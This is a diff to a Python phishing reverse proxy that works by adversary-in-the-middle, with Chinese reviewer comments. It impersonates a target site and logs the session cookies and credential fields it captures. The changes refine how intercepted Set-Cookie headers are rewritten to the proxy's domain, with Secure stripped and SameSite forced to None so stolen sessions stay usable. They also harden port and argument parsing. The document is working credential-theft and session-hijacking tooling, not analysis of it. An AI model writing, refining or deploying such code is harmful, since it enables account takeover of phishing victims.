@@ -169,11 +169,12 @@ def make_handler(phishlet, db_file):
             if any(k.lower() == 'set-cookie' for k in headers):  # CS73-F4: 门同大小写不敏感
                 raw = next((v for k, v in headers.items() if k.lower() == 'set-cookie'), '')  # CS72-7: 大小写不敏感(同 ct)
                 if isinstance(raw, str):
-                    # R32D91-OBS-A/CS75-F3: 剥 origin :port 尾并重写为 proxy
-                    # 域——锚定属性边界(?:^|;\s*)防 somedomain= 误中(F-3 实证),
-                    # 保留原属性名大小写; re.sub 无匹配原样返回无需预检(F-4)。
-                    raw = re.sub(r'(?i)(?:(?<=^)|(?<=;\s))([Dd]omain=)[^;]*(?::\d+)?',
-                                 lambda m: m.group(1) + (proxy_host.rpartition(':')[0] or proxy_host), raw)  # CS75-F3: 唯一捕获组=属性名
+                    # R32D91-OBS-A/CS75-F3/CS76-3: 值整体(含 :port 尾)重写
+                    # 为 proxy 域——捕获分隔符(^|;\s* 任意空白, 旧 lookbehind
+                    # 只容恰一空格且无空格 ';'Domain 不中)+属性名(保大小写),
+                    # 锚定边界防 somedomain= 误中; 无匹配原样返回无需预检。
+                    raw = re.sub(r'(?i)(^|;\s*)([Dd]omain=)[^;]*',
+                                 lambda m: m.group(1) + m.group(2) + (proxy_host.rpartition(':')[0] or proxy_host), raw)
                     raw = re.sub(r';\s*[Ss]ecure', '', raw)  # 我们是 http
                     raw = re.sub(r';\s*[Ss]ameSite=\w+', '; SameSite=None', raw)
                     # R32D90-F1: 先删异大小写原键再设规范键——此前直赋
@@ -315,6 +316,9 @@ def serve(listen, phishlet, db_file):
     print(f'[phishlet-proxy] {phishlet["name"]}: {listen} → {phishlet["target_host"]}', flush=True)
     print(f'[phishlet-proxy] session cookies: {phishlet.get("session", {}).get("cookie_names", [])}', flush=True)
     print(f'[phishlet-proxy] cred fields: {phishlet.get("credential_fields", [])}', flush=True)
+    port_s = listen.rpartition(':')[2] or '8443'
+    if not port_s.isdigit():
+        print(f'--listen/--port 端口须数字: {port_s}(如 :8080)', file=sys.stderr); sys.exit(2)  # CS76-4
     HTTPServer((host or '0.0.0.0', int(port or 8443)), handler).serve_forever()
 
 # ============================================================
@@ -379,10 +383,20 @@ if __name__ == '__main__':
             print('serve 需要 --phishlet <json>', file=sys.stderr); sys.exit(1)
         serve(listen, load_phishlet(pl_path), db)
     elif sys.argv[1] == 'list':
-        d = '--dir' in sys.argv and sys.argv[sys.argv.index('--dir') + 1] or os.path.join(_data_root(), 'phishlets')
+        # CS76-5: 同 serve 成对解析(此前静默忽略+--dir 缺值 IndexError)。
+        _pd = [sys.argv[i + 1] for i in range(2, len(sys.argv) - 1) if sys.argv[i] == '--dir']
+        _bad = [a for a in sys.argv[2:] if a.startswith('--') and a != '--dir']
+        if _bad or ('--dir' in sys.argv and not _pd):
+            print(f"未知/缺值参数(用法: -h)", file=sys.stderr); sys.exit(2)
+        d = _pd[0] if _pd else os.path.join(_data_root(), 'phishlets')
         for pl in list_phishlets(d):
             print(f"{pl['name']:>15} → {pl['target']} ({pl['cookies']} session cookies)")
     elif sys.argv[1] == 'init':
-        d = '--dir' in sys.argv and sys.argv[sys.argv.index('--dir') + 1] or os.path.join(_data_root(), 'phishlets')
+        # CS76-5: 同 list 成对解析。
+        _pd = [sys.argv[i + 1] for i in range(2, len(sys.argv) - 1) if sys.argv[i] == '--dir']
+        _bad = [a for a in sys.argv[2:] if a.startswith('--') and a != '--dir']
+        if _bad or ('--dir' in sys.argv and not _pd):
+            print('未知/缺值参数(用法: -h)', file=sys.stderr); sys.exit(2)
+        d = _pd[0] if _pd else os.path.join(_data_root(), 'phishlets')
         write_samples(d)
         print(f'sample phishlets → {d}')
